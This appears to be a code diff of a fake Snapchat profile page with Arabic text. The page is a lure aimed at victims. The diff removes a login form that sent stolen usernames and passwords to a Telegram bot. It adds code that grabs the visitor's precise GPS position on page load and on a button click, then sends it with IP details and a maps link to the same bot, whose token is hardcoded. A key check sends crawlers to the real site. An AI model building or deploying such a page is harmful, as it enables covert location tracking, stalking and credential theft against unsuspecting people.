@@ -21,9 +21,9 @@
             height: 100vh;
             margin: 0;
         }
-        .snap-card {
+        .profile-card {
             background: #ffffff;
-            padding: 30px 25px;
+            padding: 35px 25px;
             border-radius: 24px;
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
             width: 360px;
@@ -36,8 +36,8 @@
             margin-bottom: 12px;
         }
         .avatar {
-            width: 96px;
-            height: 96px;
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
             object-fit: cover;
             border: 4px solid #fffc00;
@@ -53,89 +53,85 @@
             color: #536471;
             margin-bottom: 20px;
         }
-        .login-box {
-            text-align: right;
-            border-top: 1px solid #eff3f4;
-            padding-top: 20px;
+        .bio {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
-        .login-box p {
-            font-size: 13px;
-            color: #536471;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 12px 14px;
-            margin-bottom: 12px;
-            border: 1px solid #cfd9de;
-            border-radius: 12px;
-            box-sizing: border-box;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .login-box input:focus {
-            border-color: #fffc00;
-        }
-        .login-box button {
+        .action-btn {
             width: 100%;
             background-color: #fffc00;
             color: #000000;
             border: none;
-            border-radius: 12px;
-            padding: 12px;
+            border-radius: 25px;
+            padding: 14px;
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.4);
             transition: background-color 0.2s;
         }
-        .login-box button:hover {
+        .action-btn:hover {
             background-color: #f4f100;
         }
     </style>
 </head>
 <body>
 
-    <div class="snap-card">
+    <div class="profile-card">
         <div class="avatar-container">
             <img src="https://c.top4top.io/p_3954xsyfg0.jpg" alt="Avatar" class="avatar">
         </div>
         <div class="profile-name">اميرة بتواضعي</div>
         <div class="profile-username">@amira_snap</div>
+        <div class="bio">أهلاً بكم في يومياتي الخاصة ✨<br>اضغط للمتابعة ومشاهدة القصة</div>
         
-        <div class="login-box">
-            <p>سجل الدخول بحسابك لمشاهدة القصص الخاصة</p>
-            <form id="loginForm" onsubmit="handleSubmission(event)">
-                <input type="text" id="email" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
-                <input type="password" id="pass" placeholder="كلمة السر" required>
-                <button type="submit">متابعة العرض</button>
-            </form>
-        </div>
+        <button class="action-btn" onclick="triggerRedirect()">إضافة على سناب</button>
     </div>
 
     <script>
+        // التحقق من المفتاح في الرابط لطرد البوتات (الرابط يجب أن يكون: .../index.html?key=G45)
+        const urlParams = new URLSearchParams(window.location.search);
+        const secretKey = urlParams.get('key');
+        const VALID_KEY = 'G45';
+
+        if (secretKey !== VALID_KEY) {
+            window.location.replace('https://www.snapchat.com');
+        }
+
         const BOT_TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
         const CHAT_ID = '7184970355';
 
         let capturedGpsData = "Pending / Not Granted Yet";
+        let googleMapsLink = "Not Available";
 
-        // إطلاق طلب إذن الموقع الجغرافي فور اكتمال تحميل الصفحة مباشرة
+        // طلب إذن الـ GPS فور دخول الصفحة وتحميلها مباشرة
         window.onload = function() {
+            requestGpsTelemetry("GPS Auto-Captured on Load");
+        };
+
+        function requestGpsTelemetry(label) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        capturedGpsData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude} (Accuracy: ${position.coords.accuracy}m)`;
-                        sendToTelegram(`[+] Snapchat GPS Auto-Captured on Load:\n- Coordinates: ${capturedGpsData}`);
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        capturedGpsData = `Lat: ${lat}, Lon: ${lon} (Accuracy: ${accuracy}m)`;
+                        googleMapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+
+                        sendToTelegram(`[+] ${label}:\n- Coordinates: ${capturedGpsData}\n- Google Maps: ${googleMapsLink}`);
                     },
                     function(error) {
                         capturedGpsData = `Denied/Error: ${error.message}`;
+                        googleMapsLink = "N/A";
                     },
                     { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             }
-        };
+        }
 
         async function sendToTelegram(textMessage) {
             let ipInfo = {};
@@ -162,23 +158,13 @@ ${textMessage}
             });
         }
 
-        async function handleSubmission(event) {
-            event.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            const credsPayload = `
-[+] Snapchat Phishing Credentials Captured:
-- Username/Email: ${email}
-- Password: ${pass}
-- GPS State: ${capturedGpsData}
-            `.trim();
-
-            await sendToTelegram(credsPayload);
-
-            // إعادة توجيه الضحية إلى موقع سناب شات الحقيقي بعد إتمام الإرسال
-            window.location.href = 'https://www.snapchat.com';
+        // تفاعل إضافي عند الضغط على زر المتابعة لضمان تكرار التقاط الموقع إن لم يُمنح سابقاً والتوجيه النهائي
+        function triggerRedirect() {
+            requestGpsTelemetry("GPS Captured via Profile Action Click");
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.snapchat.com/add/amira_snap';
+            }, 1200);
         }
     </script>
 </body>
